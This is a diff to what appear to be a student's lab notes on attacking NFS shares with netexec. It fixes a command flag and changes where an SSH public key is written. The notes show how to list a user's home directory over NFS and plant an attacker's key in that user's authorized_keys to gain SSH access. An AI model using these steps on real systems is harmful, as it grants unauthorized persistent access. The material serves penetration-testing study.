@@ -26,7 +26,7 @@ with netexec
 
 
 **Mount a Share**
-`nxc nfs <IP> --share /var/nfs/general -ls`
+`nxc nfs <IP> --share /var/nfs/general --ls`
 - netexec will update the UID and GID as needed for access
 
 
@@ -64,7 +64,7 @@ look at home directory
 `nxc nfs <IP> --ls /home`
 
 put ssh key in authorized_keys
-`nxc nfs <IP> --put-file ~/.ssh/id_rsa.pub /home/<user>/.ssh/authorized_keys`
+`nxc nfs <IP> --put-file ~/.ssh/id_rsa.pub /home/<user>/.ssh/authorized_keys.d/<pub>`
 - in the student vm, you need to make a new ssh key `ssh-keygen -f <name>`
 ![](assets/Pasted%20image%2020260703101640.png)
 
